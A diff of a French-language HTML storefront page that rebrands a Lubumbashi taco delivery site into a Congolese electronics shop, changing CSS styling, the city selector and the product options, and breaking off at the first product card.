@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>LUSHI TACOS | Fast Food - Lubumbashi</title>
+  <title>CONGO ELECTRONIQUE | Tech Premium RDC</title>
   <!-- Google Fonts & Font Awesome Icons -->
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    /* STYLE GÉNÉRAL - INSPIRÉ DU SITE ORIGINAL MAIS ADAPTÉ TACOS */
+    /* VOTRE CSS ORIGINAL RESTE IDENTIQUE - PAS DE CHANGEMENT */
     * {
       margin: 0;
       padding: 0;
@@ -17,7 +17,7 @@
     }
 
     body {
-      background: #1a0f0a;
+      background: #0a0c15;
       color: #fff;
       overflow-x: hidden;
     }
@@ -27,7 +27,7 @@
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      background: radial-gradient(circle at 30% 30%, #5d3a1a, #2c1a0e 70%);
+      background: radial-gradient(circle at 30% 30%, #1e2a3a, #0b0f1a 70%);
       z-index: -2;
     }
 
@@ -39,17 +39,16 @@
       z-index: -1;
       animation: floatGlow 14s infinite alternate ease-in-out;
     }
-    .light1 { width: 500px; height: 500px; background: #f97316; top: -100px; left: -100px; }
-    .light2 { width: 450px; height: 450px; background: #dc2626; bottom: -50px; right: -50px; animation-delay: 2s; }
-    .light3 { width: 400px; height: 400px; background: #fbbf24; top: 40%; left: 70%; animation-delay: 5s; }
-    .light4 { width: 380px; height: 380px; background: #84cc16; bottom: 20%; left: 10%; animation-delay: 1s; }
+    .light1 { width: 500px; height: 500px; background: #d4af37; top: -100px; left: -100px; }
+    .light2 { width: 450px; height: 450px; background: #3b82f6; bottom: -50px; right: -50px; animation-delay: 2s; }
+    .light3 { width: 400px; height: 400px; background: #a855f7; top: 40%; left: 70%; animation-delay: 5s; }
+    .light4 { width: 380px; height: 380px; background: #ec4899; bottom: 20%; left: 10%; animation-delay: 1s; }
 
     @keyframes floatGlow {
       0% { transform: translateY(-40px) translateX(-20px) scale(1); opacity: 0.2; }
       100% { transform: translateY(50px) translateX(30px) scale(1.2); opacity: 0.35; }
     }
 
-    /* SECTION HERO - DEMANDE DE LOCALISATION */
     .hero {
       min-height: 100vh;
       display: flex;
@@ -58,44 +57,35 @@
       padding: 20px 16px;
     }
 
-    .location-card {
+    .region-card {
       width: 100%;
       max-width: 560px;
-      background: rgba(30, 20, 15, 0.7);
+      background: rgba(15, 20, 30, 0.6);
       backdrop-filter: blur(25px);
       -webkit-backdrop-filter: blur(25px);
-      border: 1px solid rgba(249, 115, 22, 0.4);
+      border: 1px solid rgba(212, 175, 55, 0.25);
       border-radius: 48px;
       padding: 48px 28px;
-      box-shadow: 0 30px 70px rgba(0,0,0,0.7), 0 0 0 1px rgba(249,115,22,0.2) inset;
+      box-shadow: 0 30px 70px rgba(0,0,0,0.7), 0 0 0 1px rgba(212,175,55,0.15) inset;
       animation: fadeUp 1s ease-out;
-      text-align: center;
     }
 
-    .location-card h1 {
-      font-size: 42px;
-      font-weight: 900;
-      background: linear-gradient(145deg, #f97316, #dc2626, #fbbf24);
+    .region-card h1 {
+      font-size: 34px;
+      font-weight: 800;
+      background: linear-gradient(145deg, #fbbf24, #d4af37, #f59e0b);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      margin-bottom: 15px;
+      margin-bottom: 12px;
       letter-spacing: -0.5px;
-      text-transform: uppercase;
     }
 
-    .location-card h1 i {
-      font-size: 48px;
-      margin-right: 10px;
-      background: none;
-      -webkit-text-fill-color: #f97316;
-    }
-
-    .location-card p {
-      font-size: 16px;
-      color: #fde68a;
+    .region-card p {
+      font-size: 15px;
+      color: #cfd9e6;
       margin-bottom: 30px;
       line-height: 1.6;
-      font-weight: 400;
+      font-weight: 300;
     }
 
     .select-wrapper {
@@ -107,38 +97,38 @@
       left: 20px;
       top: 50%;
       transform: translateY(-50%);
-      color: #f97316;
+      color: #d4af37;
       font-size: 18px;
       z-index: 2;
     }
-    .location-card select {
+    .region-card select {
       width: 100%;
       padding: 18px 20px 18px 50px;
-      background: #2c1a0e;
-      border: 1px solid #f97316;
+      background: #121b29;
+      border: 1px solid #2d3a4e;
       border-radius: 60px;
       color: white;
       font-size: 16px;
       appearance: none;
       -webkit-appearance: none;
-      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23f97316' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23d4af37' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
       background-repeat: no-repeat;
       background-position: right 20px center;
       background-size: 18px;
       transition: all 0.3s;
     }
-    .location-card select:focus {
-      border-color: #fbbf24;
-      box-shadow: 0 0 0 3px rgba(249,115,22,0.3);
+    .region-card select:focus {
+      border-color: #d4af37;
+      box-shadow: 0 0 0 3px rgba(212,175,55,0.3);
       outline: none;
     }
 
-    .btn-locate {
+    .btn-geo {
       width: 100%;
       padding: 18px 16px;
       border: none;
       border-radius: 60px;
-      background: linear-gradient(95deg, #f97316, #dc2626, #fbbf24);
+      background: linear-gradient(95deg, #d4af37, #fbbf24, #f59e0b);
       color: #0a0c15;
       font-weight: 800;
       font-size: 18px;
@@ -146,19 +136,19 @@
       align-items: center;
       justify-content: center;
       gap: 14px;
-      box-shadow: 0 12px 30px rgba(249,115,22,0.4);
+      box-shadow: 0 12px 30px rgba(212,175,55,0.4);
       cursor: pointer;
       transition: 0.25s;
       margin-top: 10px;
     }
-    .btn-locate i {
+    .btn-geo i {
       font-size: 20px;
     }
-    .btn-locate:hover {
+    .btn-geo:hover {
       transform: scale(1.02) translateY(-4px);
-      box-shadow: 0 20px 40px #f97316;
+      box-shadow: 0 20px 40px #d4af37;
     }
-    .btn-locate:active {
+    .btn-geo:active {
       transform: scale(0.98);
     }
 
@@ -174,21 +164,18 @@
       padding: 6px 16px;
       border-radius: 40px;
       font-size: 13px;
-      border: 1px solid rgba(249,115,22,0.3);
-      color: #fde68a;
+      border: 1px solid rgba(212,175,55,0.2);
+      color: #cbd5e1;
     }
     .trust-badges i {
-      color: #f97316;
+      color: #d4af37;
       margin-right: 8px;
     }
 
-    /* SECTION PRINCIPALE (CACHÉE AU DÉBUT) */
     .main {
       display: none;
       padding: 24px 20px 50px;
       animation: fadeIn 0.8s;
-      max-width: 1400px;
-      margin: 0 auto;
     }
 
     .main-header {
@@ -196,312 +183,168 @@
       margin: 15px 0 30px;
     }
     .main-header h2 {
-      font-size: 48px;
-      font-weight: 900;
-      background: linear-gradient(130deg, #f97316, #dc2626, #fbbf24);
+      font-size: 40px;
+      font-weight: 800;
+      background: linear-gradient(130deg, #fbbf24, #d4af37);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       line-height: 1.2;
-      text-transform: uppercase;
     }
     .main-header p {
-      color: #fde68a;
-      font-size: 18px;
+      color: #a0afc0;
+      font-size: 16px;
       max-width: 600px;
       margin: 12px auto 0;
     }
 
-    /* GRILLE PRODUITS (TACOS) */
     .product-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-      gap: 30px;
-      margin: 50px 0;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 20px;
+      margin: 40px 0;
     }
 
     .product-card {
-      background: rgba(40, 25, 20, 0.7);
+      background: rgba(20, 28, 40, 0.6);
       backdrop-filter: blur(10px);
-      border: 1px solid rgba(249,115,22,0.3);
-      border-radius: 40px;
-      padding: 25px 15px 20px;
+      border: 1px solid rgba(255,215,0,0.15);
+      border-radius: 32px;
+      padding: 22px 12px 18px;
       text-align: center;
       transition: all 0.3s;
-      box-shadow: 0 20px 40px -10px black;
+      box-shadow: 0 15px 30px -10px black;
       cursor: pointer;
     }
     .product-card:hover {
-      transform: translateY(-12px) scale(1.02);
-      border-color: #f97316;
-      box-shadow: 0 30px 50px -5px #f97316;
+      transform: translateY(-10px);
+      border-color: #d4af37;
+      box-shadow: 0 25px 40px -5px #d4af3740;
     }
 
     .product-card img {
       width: 100%;
-      max-width: 180px;
-      height: 180px;
-      margin: 0 auto 20px;
-      border-radius: 50%;
+      max-width: 130px;
+      height: auto;
+      margin: 0 auto 15px;
+      border-radius: 24px;
       background: #fff;
       padding: 8px;
       object-fit: cover;
       aspect-ratio: 1/1;
-      box-shadow: 0 15px 30px rgba(0,0,0,0.6);
-      border: 3px solid #f97316;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
     }
 
     .product-card h3 {
-      font-size: 22px;
-      font-weight: 800;
-      color: #fde68a;
+      font-size: 16px;
+      font-weight: 700;
+      color: #f3e5c7;
       margin-bottom: 8px;
     }
     .product-card .price {
-      color: #f97316;
-      font-weight: 900;
-      font-size: 26px;
-      margin: 10px 0;
-    }
-    .product-card .stars i {
-      color: #fbbf24;
-      font-size: 16px;
-      margin: 0 2px;
+      color: #d4af37;
+      font-weight: 800;
+      font-size: 18px;
     }
 
-    /* BANNIÈRES SPÉCIALES */
     .cat-banner {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 25px;
-      margin: 50px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      margin: 40px 0;
     }
     .banner-item {
-      background: linear-gradient(125deg, #5d3a1a, #2c1a0e);
-      border-radius: 40px;
-      padding: 25px;
+      background: linear-gradient(125deg, #1e2a3a, #0f172a);
+      border-radius: 36px;
+      padding: 20px;
       display: flex;
       align-items: center;
       gap: 20px;
-      border: 1px solid #f97316;
+      border: 1px solid #d4af3733;
     }
     .banner-item img {
-      width: 120px;
-      height: 120px;
-      border-radius: 50%;
+      width: 110px;
+      height: 110px;
+      border-radius: 30px;
       background: white;
-      padding: 5px;
+      padding: 6px;
       object-fit: cover;
-      border: 3px solid #f97316;
     }
     .banner-text h4 {
-      font-size: 24px;
-      font-weight: 800;
-      color: #fbbf24;
+      font-size: 20px;
+      font-weight: 700;
+      color: #fde047;
     }
     .banner-text p {
-      color: #fde68a;
-      font-size: 15px;
-    }
-    .banner-text .price {
-      color: #f97316;
-      font-size: 22px;
-      font-weight: 900;
+      color: #b9c7da;
+      font-size: 14px;
     }
 
-    /* MARQUES / PARTENAIRES */
     .brands {
       display: flex;
       flex-wrap: wrap;
       justify-content: center;
-      align-items: center;
-      gap: 40px;
-      margin: 60px 0 30px;
+      gap: 30px;
+      margin: 45px 0 30px;
     }
     .brands img {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      border-radius: 40px;
       background: white;
-      padding: 15px;
-      filter: drop-shadow(0 5px 15px #f97316);
+      padding: 12px;
+      filter: drop-shadow(0 5px 10px gold);
       transition: 0.2s;
-      object-fit: contain;
-    }
-    .brands img:hover {
-      transform: scale(1.1);
     }
 
-    /* TÉMOIGNAGES */
     .testimonials {
-      background: rgba(0,0,0,0.4);
-      border-radius: 50px;
-      padding: 40px 30px;
-      margin: 50px 0;
-      border: 1px solid #f97316;
+      background: rgba(0,0,0,0.35);
+      border-radius: 40px;
+      padding: 32px 20px;
+      margin: 40px 0;
+      border: 1px solid #d4af3720;
     }
     .testimonials h3 {
-      font-size: 32px;
-      margin-bottom: 30px;
-      color: #fbbf24;
-      text-align: center;
+      font-size: 26px;
+      margin-bottom: 25px;
+      color: #f3cd85;
     }
     .testi-grid {
       display: grid;
-      gap: 25px;
-      grid-template-columns: repeat(auto-fit, minmax(280px,1fr));
+      gap: 20px;
+      grid-template-columns: repeat(auto-fit, minmax(240px,1fr));
     }
     .testi-card {
-      background: #2c1a0e;
-      border-radius: 30px;
-      padding: 28px 20px;
+      background: #1b2437;
+      border-radius: 28px;
+      padding: 24px 18px;
       display: flex;
       flex-direction: column;
       align-items: center;
       text-align: center;
-      border: 1px solid #f97316;
     }
     .testi-card img {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      border-radius: 50px;
       object-fit: cover;
-      border: 3px solid #f97316;
-      margin-bottom: 15px;
+      border: 2px solid #d4af37;
+      margin-bottom: 12px;
     }
-    .testi-card .stars i {
-      color: #fbbf24;
-      margin: 10px 0;
+    .testi-card i {
+      color: #d4af37;
+      margin: 8px 0;
     }
     .testi-card p {
       font-style: italic;
-      color: #fde68a;
-      font-size: 15px;
-    }
-    .testi-card h4 {
-      color: #f97316;
-      margin-top: 15px;
+      color: #cfdefa;
     }
 
-    /* SECTIONS SUPPLEMENTAIRES */
-    .home-sections {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 20px 60px;
-    }
-    .section-title {
-      font-size: 36px;
-      font-weight: 800;
-      text-align: center;
-      margin: 60px 0 40px;
-      background: linear-gradient(145deg, #f97316, #fbbf24);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .values-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 30px;
-      margin: 40px 0;
-    }
-    .value-card {
-      background: rgba(40, 25, 20, 0.6);
-      backdrop-filter: blur(8px);
-      border: 1px solid #f97316;
-      border-radius: 40px;
-      padding: 35px 20px;
-      text-align: center;
-    }
-    .value-card i {
-      font-size: 50px;
-      color: #f97316;
-      margin-bottom: 20px;
-    }
-    .value-card h4 {
-      font-size: 22px;
-      margin-bottom: 12px;
-      color: #fbbf24;
-    }
-    .value-card p {
-      color: #fde68a;
-      font-size: 15px;
-    }
-
-    /* BLOG / ACTUALITÉS */
-    .blog-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 30px;
-    }
-    .blog-card {
-      background: #2c1a0e;
-      border-radius: 40px;
-      padding: 25px;
-      border: 1px solid #f97316;
-    }
-    .blog-card img {
-      width: 100%;
-      height: 200px;
-      object-fit: cover;
-      border-radius: 30px;
-      margin-bottom: 15px;
-      border: 2px solid #f97316;
-    }
-    .blog-card h4 {
-      color: #fbbf24;
-      font-size: 20px;
-      font-weight: 700;
-    }
-    .blog-card p {
-      color: #fde68a;
-      font-size: 14px;
-      margin: 12px 0;
-    }
-    .blog-card .btn-link {
-      color: #f97316;
-      text-decoration: none;
-      font-weight: 700;
-      font-size: 16px;
-    }
-
-    /* BANNIÈRE APPLICATION */
-    .app-banner {
-      background: linear-gradient(135deg, #5d3a1a, #2c1a0e);
-      border-radius: 60px;
-      padding: 40px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 30px;
-      margin: 60px 0;
-      border: 1px solid #f97316;
-    }
-    .app-text h3 {
-      font-size: 32px;
-      color: #fbbf24;
-      font-weight: 800;
-    }
-    .app-text p {
-      color: #fde68a;
-      max-width: 400px;
-    }
-    .app-stores img {
-      height: 60px;
-      margin: 0 10px;
-      border-radius: 20px;
-    }
-
-    /* FOOTER */
     .footer {
-      margin-top: 70px;
-      border-top: 2px solid #f97316;
-      padding: 40px 0 20px;
+      margin-top: 60px;
+      border-top: 1px solid #d4af3720;
+      padding: 30px 0 10px;
       text-align: center;
-      color: #fde68a;
-    }
-    .footer i {
-      color: #f97316;
-      margin: 0 5px;
+      color: #8c9bb3;
     }
 
     @keyframes fadeUp {
@@ -513,24 +356,124 @@
       100% { opacity: 1; }
     }
 
-    /* RESPONSIVE */
-    @media (max-width: 700px) {
-      .location-card { padding: 40px 18px; }
-      .location-card h1 { font-size: 32px; }
-      .btn-locate { font-size: 16px; }
-      .product-grid { grid-template-columns: 1fr 1fr; gap: 15px; }
-      .product-card img { max-width: 140px; height: 140px; }
-      .main-header h2 { font-size: 32px; }
-      .banner-item { flex-direction: column; text-align: center; }
-      .brands img { width: 70px; height: 70px; }
-    }
-
     @media (max-width: 480px) {
-      .product-grid { grid-template-columns: 1fr; }
-      .product-card { max-width: 320px; margin: 0 auto; }
+      .region-card { padding: 40px 18px; border-radius: 36px; }
+      .region-card h1 { font-size: 28px; }
+      .btn-geo { font-size: 16px; padding: 16px; }
+      .product-grid { grid-template-columns: 1fr 1fr; gap: 12px; }
+      .product-card img { max-width: 100px; }
+      .banner-item { flex-direction: column; text-align: center; }
+      .banner-item img { width: 90px; height: 90px; }
+      .brands img { width: 60px; height: 60px; }
+      .main-header h2 { font-size: 32px; }
     }
 
-    /* STYLES POUR LA MODALE DE DÉTAIL PRODUIT */
+    @media (max-width: 360px) {
+      .product-grid { grid-template-columns: 1fr; }
+    }
+
+    .stars i { color: #fbbf24; font-size: 14px; margin: 0 2px; }
+
+    .home-sections {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px 60px;
+    }
+    .section-title {
+      font-size: 32px;
+      font-weight: 700;
+      text-align: center;
+      margin: 60px 0 40px;
+      background: linear-gradient(145deg, #fbbf24, #d4af37);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .values-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 30px;
+      margin: 40px 0;
+    }
+    .value-card {
+      background: rgba(20, 28, 40, 0.5);
+      backdrop-filter: blur(8px);
+      border: 1px solid #d4af3720;
+      border-radius: 36px;
+      padding: 30px 20px;
+      text-align: center;
+    }
+    .value-card i {
+      font-size: 48px;
+      color: #d4af37;
+      margin-bottom: 20px;
+    }
+    .value-card h4 {
+      font-size: 22px;
+      margin-bottom: 12px;
+      color: #f3e5c7;
+    }
+    .value-card p {
+      color: #a0afc0;
+      font-size: 15px;
+    }
+    .blog-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 25px;
+    }
+    .blog-card {
+      background: #121b29;
+      border-radius: 32px;
+      padding: 20px;
+      border: 1px solid #d4af3720;
+    }
+    .blog-card img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      border-radius: 24px;
+      margin-bottom: 15px;
+    }
+    .blog-card h4 {
+      color: #fde047;
+      font-size: 18px;
+    }
+    .blog-card p {
+      color: #9aa9bb;
+      font-size: 14px;
+      margin: 10px 0;
+    }
+    .blog-card .btn-link {
+      color: #d4af37;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .app-banner {
+      background: linear-gradient(135deg, #1e2a3a, #0f172a);
+      border-radius: 50px;
+      padding: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 30px;
+      margin: 50px 0;
+      border: 1px solid #d4af3733;
+    }
+    .app-text h3 {
+      font-size: 28px;
+      color: #fde047;
+    }
+    .app-text p {
+      color: #b9c7da;
+      max-width: 400px;
+    }
+    .app-stores img {
+      height: 50px;
+      margin: 0 8px;
+      border-radius: 16px;
+    }
+    
     .modal-overlay {
       display: none;
       position: fixed;
@@ -538,7 +481,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0, 0, 0, 0.9);
+      background-color: rgba(0, 0, 0, 0.8);
       backdrop-filter: blur(8px);
       z-index: 1000;
       justify-content: center;
@@ -547,14 +490,14 @@
     }
     
     .modal-container {
-      background: #2c1a0e;
-      border-radius: 50px;
-      max-width: 1000px;
+      background: #0f1a24;
+      border-radius: 40px;
+      max-width: 900px;
       width: 100%;
       max-height: 90vh;
       overflow-y: auto;
-      border: 2px solid #f97316;
-      box-shadow: 0 30px 60px rgba(249, 115, 22, 0.4);
+      border: 1px solid #d4af37;
+      box-shadow: 0 30px 60px rgba(212, 175, 55, 0.3);
       animation: modalFadeIn 0.4s;
       position: relative;
     }
@@ -569,20 +512,20 @@
       justify-content: space-between;
       align-items: center;
       padding: 25px 30px;
-      border-bottom: 2px solid #f97316;
+      border-bottom: 1px solid #d4af3733;
     }
     
     .modal-header h2 {
-      color: #fbbf24;
-      font-size: 32px;
-      font-weight: 800;
+      color: #fde047;
+      font-size: 28px;
+      font-weight: 700;
     }
     
     .close-modal {
       background: none;
       border: none;
-      color: #f97316;
-      font-size: 48px;
+      color: #d4af37;
+      font-size: 36px;
       cursor: pointer;
       transition: 0.2s;
     }
@@ -593,60 +536,56 @@
     }
     
     .modal-body {
-      padding: 35px;
+      padding: 30px;
     }
     
     .product-detail-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 40px;
+      gap: 30px;
     }
     
     .product-gallery {
       display: flex;
       flex-direction: column;
-      gap: 20px;
+      gap: 15px;
     }
     
     .main-image {
       background: #fff;
-      border-radius: 40px;
-      padding: 25px;
+      border-radius: 30px;
+      padding: 20px;
       aspect-ratio: 1/1;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 3px solid #f97316;
     }
     
     .main-image img {
       max-width: 100%;
-      max-height: 300px;
+      max-height: 250px;
       object-fit: contain;
-      border-radius: 30px;
     }
     
     .thumbnail-list {
       display: flex;
-      gap: 15px;
+      gap: 10px;
       justify-content: center;
-      flex-wrap: wrap;
     }
     
     .thumbnail {
-      width: 90px;
-      height: 90px;
+      width: 70px;
+      height: 70px;
       background: #fff;
-      border-radius: 20px;
-      padding: 10px;
+      border-radius: 15px;
+      padding: 8px;
       cursor: pointer;
       border: 2px solid transparent;
       transition: 0.2s;
     }
     
     .thumbnail.active {
-      border-color: #f97316;
-      transform: scale(1.05);
+      border-color: #d4af37;
     }
     
     .thumbnail img {
@@ -656,13 +595,13 @@
     }
     
     .product-info-detail {
-      color: #fde68a;
+      color: #e0e7ff;
     }
     
     .product-info-detail .price-large {
-      font-size: 48px;
-      font-weight: 900;
-      color: #f97316;
+      font-size: 42px;
+      font-weight: 800;
+      color: #d4af37;
       margin: 15px 0;
     }
     
@@ -674,15 +613,11 @@
     }
     
     .product-rating .stars {
-      font-size: 22px;
-    }
-    
-    .product-rating .stars i {
-      color: #fbbf24;
+      font-size: 20px;
     }
     
     .product-rating span {
-      color: #fde68a;
+      color: #9aa9bb;
     }
     
     .product-options {
@@ -690,50 +625,65 @@
     }
     
     .option-group {
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
     
     .option-group h4 {
-      color: #fbbf24;
-      margin-bottom: 12px;
-      font-size: 18px;
+      color: #fde047;
+      margin-bottom: 10px;
+      font-size: 16px;
     }
     
-    .spice-options, .size-options, .extras-options {
+    .color-options {
       display: flex;
-      gap: 12px;
+      gap: 10px;
+    }
+    
+    .color-dot {
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      cursor: pointer;
+      border: 2px solid transparent;
+    }
+    
+    .color-dot.selected {
+      border-color: #fff;
+      box-shadow: 0 0 0 2px #d4af37;
+    }
+    
+    .storage-options {
+      display: flex;
+      gap: 10px;
       flex-wrap: wrap;
     }
     
-    .spice-btn, .size-btn, .extra-btn {
-      background: #1a0f0a;
-      border: 2px solid #f97316;
+    .storage-btn {
+      background: #1b2437;
+      border: 1px solid #d4af3733;
       color: white;
-      padding: 10px 22px;
-      border-radius: 50px;
+      padding: 8px 18px;
+      border-radius: 30px;
       cursor: pointer;
       font-weight: 600;
-      transition: 0.2s;
     }
     
-    .spice-btn.selected, .size-btn.selected, .extra-btn.selected {
-      background: #f97316;
-      color: #1a0f0a;
-      border-color: #fbbf24;
+    .storage-btn.selected {
+      background: #d4af37;
+      color: #0a0c15;
+      border-color: #d4af37;
     }
     
     .product-specs {
-      background: #1a0f0a;
-      border-radius: 30px;
-      padding: 25px;
+      background: #121b29;
+      border-radius: 24px;
+      padding: 20px;
       margin: 25px 0;
-      border: 1px solid #f97316;
     }
     
     .product-specs h4 {
-      color: #fbbf24;
+      color: #fde047;
       margin-bottom: 15px;
-      font-size: 20px;
     }
     
     .specs-list {
@@ -742,53 +692,49 @@
     
     .specs-list li {
       padding: 10px 0;
-      border-bottom: 1px solid #f97316;
+      border-bottom: 1px solid #d4af371a;
       display: flex;
-      gap: 12px;
-      font-size: 15px;
+      gap: 10px;
     }
     
     .specs-list li i {
-      color: #f97316;
-      width: 25px;
+      color: #d4af37;
+      width: 20px;
     }
     
     .btn-add-cart {
       width: 100%;
-      padding: 20px;
-      background: linear-gradient(95deg, #f97316, #dc2626);
+      padding: 18px;
+      background: linear-gradient(95deg, #d4af37, #fbbf24);
       border: none;
       border-radius: 60px;
-      color: white;
-      font-weight: 900;
-      font-size: 20px;
+      color: #0a0c15;
+      font-weight: 800;
+      font-size: 18px;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 15px;
+      gap: 12px;
       cursor: pointer;
       transition: 0.2s;
       margin-top: 20px;
-      text-transform: uppercase;
     }
     
     .btn-add-cart:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 20px 40px #f97316;
+      transform: translateY(-3px);
+      box-shadow: 0 15px 30px #d4af3740;
     }
     
     .warranty-badge {
       display: flex;
-      gap: 20px;
-      margin-top: 25px;
-      color: #fde68a;
-      font-size: 15px;
-      flex-wrap: wrap;
+      gap: 15px;
+      margin-top: 20px;
+      color: #9aa9bb;
+      font-size: 14px;
     }
     
     .warranty-badge i {
-      color: #f97316;
-      font-size: 18px;
+      color: #d4af37;
     }
     
     @media (max-width: 700px) {
@@ -796,504 +742,427 @@
         grid-template-columns: 1fr;
       }
       .modal-header h2 {
-        font-size: 24px;
-      }
-      .thumbnail {
-        width: 70px;
-        height: 70px;
+        font-size: 22px;
       }
     }
   </style>
 </head>
 <body>
-  <!-- Éléments lumineux d'arrière-plan -->
   <div class="light light1"></div>
   <div class="light light2"></div>
   <div class="light light3"></div>
   <div class="light light4"></div>
 
-  <!-- SECTION D'ENTRÉE AVEC DEMANDE DE LOCALISATION -->
   <section class="hero" id="heroSection">
-    <div class="location-card">
-      <h1><i class="fas fa-taco"></i> LUSHI TACOS</h1>
-      <p>🇨🇩 Les meilleurs tacos de Lubumbashi et du Congo • Viande grillée au feu de bois • Sauces secrètes</p>
-      <p><i class="fas fa-location-dot" style="color:#f97316; margin-right:8px;"></i>Pour livrer vos tacos bien chauds, sélectionnez votre quartier :</p>
+    <div class="region-card">
+      <h1>CONGO ELECTRONIQUE</h1>
+      <p>Bienvenue dans la boutique technologique premium en République Démocratique du Congo.</p>
+      <p><i class="fas fa-map-marker-alt" style="color:#d4af37; margin-right:8px;"></i>Sélectionnez votre région pour accéder aux livraisons sécurisées.</p>
 
       <div class="select-wrapper">
-        <i class="fas fa-map-pin"></i>
+        <i class="fas fa-city"></i>
         <select id="regionSelect">
-          <option value="" disabled selected>-- Choisissez votre quartier --</option>
-          <option value="Golf">Golf</option>
-          <option value="Bel-Air">Bel-Air</option>
-          <option value="Kampemba">Kampemba</option>
-          <option value="Lubumbashi Centre">Lubumbashi Centre</option>
-          <option value="Katuba">Katuba</option>
-          <option value="Kenya">Kenya</option>
-          <option value="Ruashi">Ruashi</option>
-          <option value="Kalebuka">Kalebuka</option>
-          <option value="Kigoma">Kigoma</option>
-          <option value="Lido">Lido</option>
+          <option value="" disabled selected>-- Choisissez votre ville --</option>
+          <option value="Lubumbashi">Lubumbashi</option>
+          <option value="Kinshasa">Kinshasa</option>
+          <option value="Goma">Goma</option>
+          <option value="Kolwezi">Kolwezi</option>
+          <option value="Likasi">Likasi</option>
+          <option value="Bukavu">Bukavu</option>
+          <option value="Matadi">Matadi</option>
+          <option value="Kisangani">Kisangani</option>
+          <option value="Mbuji-Mayi">Mbuji-Mayi</option>
+          <option value="Kananga">Kananga</option>
         </select>
       </div>
 
-      <button class="btn-locate" id="enterBtn"><i class="fas fa-location-dot"></i> VOIR LE MENU & COMMANDER</button>
+      <button class="btn-geo" id="enterBtn"><i class="fas fa-location-dot"></i> Entrer dans la boutique</button>
 
       <div class="trust-badges">
-        <span><i class="fas fa-motorcycle"></i> Livraison 30 min</span>
-        <span><i class="fas fa-money-bill-wave"></i> Mobile Money</span>
-        <span><i class="fas fa-fire"></i> Grillades au feu</span>
-        <span><i class="fas fa-award"></i> Sauce secrète</span>
-        <span><i class="fas fa-clock"></i> 10h-23h</span>
+        <span><i class="fas fa-truck"></i> Express</span>
+        <span><i class="fas fa-mobile-alt"></i> Mobile Money</span>
+        <span><i class="fas fa-shield-alt"></i> Certifié</span>
+        <span><i class="fas fa-award"></i> Garantie 2 ans</span>
+        <span><i class="fas fa-headphones"></i> Support 24/7</span>
       </div>
-      <div style="font-size:14px; color:#fde68a; margin-top:12px;">
-        <i class="fas fa-motorcycle"></i> 10 quartiers livrés instantanément
+      <div style="font-size:13px; color:#5f748e; margin-top:12px;">
+        <i class="fas fa-globe"></i> 10 villes desservies instantanément
       </div>
     </div>
   </section>
 
-  <!-- CONTENU PRINCIPAL (AFFICHÉ APRÈS GÉOLOCALISATION) -->
   <section class="main" id="mainContent">
     <div class="main-header">
-      <h2>🌮 LUSHI TACOS MENU 🌮</h2>
-      <p>Découvrez nos tacos géants, nos grilled chicken et nos sauces exclusives • Livraison rapide</p>
+      <h2>⚡ CONGO ELECTRONIQUE ⚡</h2>
+      <p>Découvrez la technologie premium, livrée chez vous en 24h • Toutes les régions RDC</p>
     </div>
 
-    <!-- GRILLE DES PRODUITS PRINCIPAUX -->
     <div class="product-grid">
-      <div class="product-card" onclick="openProductModal('tacos-mexicain')">
